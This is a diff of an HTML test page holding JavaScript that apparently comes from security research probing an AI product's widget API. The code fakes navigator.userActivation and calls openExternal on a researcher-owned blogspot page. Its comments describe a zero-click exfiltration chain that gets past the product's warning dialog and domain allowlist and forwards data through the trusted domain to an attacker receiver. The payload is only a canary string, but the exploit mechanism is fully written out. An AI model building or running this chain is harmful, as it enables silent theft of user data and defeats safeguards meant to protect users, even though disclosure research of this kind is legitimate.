@@ -1,15 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T49f clean copy page</title></head>
+<head><meta charset="utf-8"><title>T49g clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T49f CLEAN COPY PAGE (allowlist mapping: blogspot.com) &mdash; click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T49g CLEAN COPY PAGE (FULL CHAIN test) &mdash; click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
-<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T49f - allowlist mapping: is blogspot.com gate-safe? (Pluto Security research canary)
-// google.com is silent (T49e) - the allowlist includes top sites. blogspot.com
-// (Blogger) is the standout top-tier domain where USERS control JavaScript
-// (free custom themes). This probes the gate with a famous blogspot URL
-// (Google's official blog) BEFORE we invest in creating a researcher-owned
-// blog for the full chain test. Inert: opens Google's blog homepage.
+<pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">// T49g - FULL CHAIN: silent openExternal -&gt; trusted-domain user page -&gt; receiver
+// (Pluto Security research canary, inert: fake data string only)
+// blogspot.com proved gate-safe (T49f, silent). The researcher's own blog page
+// (pluto-t49-notes.blogspot.com) reads ?d= from its URL and forwards it to the
+// researcher's own receiver. This fires openExternal to that page with a fake
+// canary string. If the tab opens SILENTLY and the receiver logs the canary,
+// the entire exfiltration chain closes with ZERO victim clicks and ZERO
+// warnings: widget capture -&gt; openExternal(gate-trusted domain) -&gt; user JS on
+// the trusted domain -&gt; attacker receiver.
 (function () {
   try {
     Object.defineProperty(navigator, "userActivation", {
@@ -18,29 +21,30 @@
     });
   } catch (e) {}
 
-  var URL_T49F = "https://googleblog.blogspot.com/";
+  var URL_T49G =
+    "https://pluto-t49-notes.blogspot.com/2026/10/t49g-leak-page-starting.html?d=T49g-blogger-chain-canary";
 
   var d = document;
   var box = d.createElement("div");
-  box.id = "t49f-box";
+  box.id = "t49g-box";
   box.style.cssText = "position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;white-space:pre-wrap";
-  box.textContent = "T49f (inert) - firing googleblog.blogspot.com in 1s...";
+  box.textContent = "T49g FULL CHAIN (inert) - firing in 1s...";
   d.body.appendChild(box);
 
   setTimeout(function () {
     var api = window.oai || window.openai || window.webplus;
     if (!api || !api.openExternal) {
-      box.textContent = "T49f: no oai.openExternal API found";
+      box.textContent = "T49g: no oai.openExternal API found";
       return;
     }
     try {
-      api.openExternal({ href: URL_T49F });
+      api.openExternal({ href: URL_T49G });
       box.textContent =
-        "T49f FIRED: https://googleblog.blogspot.com/\n\n" +
-        "silent tab = blogspot.com is gate-safe -&gt; full chain test next\n" +
-        "dialog = blogspot.com is off the allowlist";
+        "T49g FIRED (inert):\npluto-t49-notes.blogspot.com/...?d=T49g-blogger-chain-canary\n\n" +
+        "silent tab = watch the tab: green text says CANARY FORWARDED\n" +
+        "then I check the receiver log for the landing";
     } catch (e) {
-      box.textContent = "T49f threw: " + e;
+      box.textContent = "T49g threw: " + e;
     }
   }, 1000);
 })();
